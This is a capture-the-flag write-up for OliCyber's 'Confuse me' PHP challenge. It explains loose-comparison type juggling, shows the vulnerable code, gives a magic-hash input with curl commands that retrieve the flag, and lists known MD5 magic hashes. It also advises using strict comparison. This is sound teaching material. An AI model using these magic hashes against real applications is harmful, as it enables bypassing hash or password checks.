# Confuse me

**Competition:** OliCyber<br>
**Category:** Web / PHP<br>
**URL:** http://confuse-me.challs.olicyber.it

---

## Description

> You can try to confuse me, but I'm sorry, you're not the right type for me.

The hint is already in the text: **"not the right type"** → type juggling.

---

## Solution

### Step 1 — Source Code Analysis

By accessing `?s` the site exposes its PHP code:

```php
if (isset($_GET['input'])) {
  $user_input = $_GET['input'];
  if ($user_input == substr(md5($user_input), 0, 24)) {
    echo "Ce l'hai fatta! Ecco la flag: $flag";
  } else {
    echo "Nope nope nope";
  }
}
```

The condition to satisfy is:

```
input == first 24 characters of md5(input)
```

---

### Step 2 — Vulnerability Identification

PHP uses two comparison operators:

- `===` (strict): compares value **and type**
- `==` (loose): compares only the **value**, with automatic type conversion

With loose comparison (`==`), PHP performs **type juggling**: if both strings look like numbers, it converts them to numbers before comparing.

In particular, any string that matches the pattern `0e[0-9]+` is interpreted by PHP as **scientific notation**: `0 × 10^n = 0.0`.

So the comparison `"0e12345" == "0e99999"` is `true`, because both evaluate to `0` as float.

---

### Step 3 — Magic Hash

There is a known input that satisfies exactly this condition:

```
input  = "0e215962017"
md5    = "0e291242476940776845150308577824"
```

- The input starts with `0e` followed only by digits → PHP interprets it as `0`
- The first 24 characters of the md5 are `0e291242476940776845150` → also `0e` + digits → PHP interprets them as `0`
- The comparison becomes `0 == 0` → **`true`**

---

### Step 4 — Exploit

With the `curl` command is sufficient:

```bash
curl -s "http://confuse-me.challs.olicyber.it/?input=0e215962017"
```

To extract only the flag:

```bash
curl -s "http://confuse-me.challs.olicyber.it/?input=0e215962017" \
  | grep -oP 'flag\{[^}]+\}'
```

**Output:**

```
flag{...}
```

---

## Conclusions

The vulnerability exploited is **PHP Loose Comparison Type Juggling**, combined with so-called **Magic Hashes**: input values whose MD5 hash has the same form `0e[0-9]+` as the input itself.

When PHP compares these strings with `==`, it interprets both as `0` in scientific notation, making the comparison true regardless of actual values.

- Never use `==` to compare strings in PHP when one of the values comes from user input
- Always use `===` (strict comparison) which compares type and value without implicit conversions
- This is especially important for comparisons of hashes, tokens, and passwords
- Magic Hashes are a known list of inputs that exploit exactly this behavior

### Table of Known MD5 Magic Hashes

| Input | MD5 |
|---|---|
| `0e215962017` | `0e291242476940776845150308577824` |
| `0e1137126905` | `0e291659922323405260514745084877` |
| `240610708` | `0e462097431906509019562988736854` |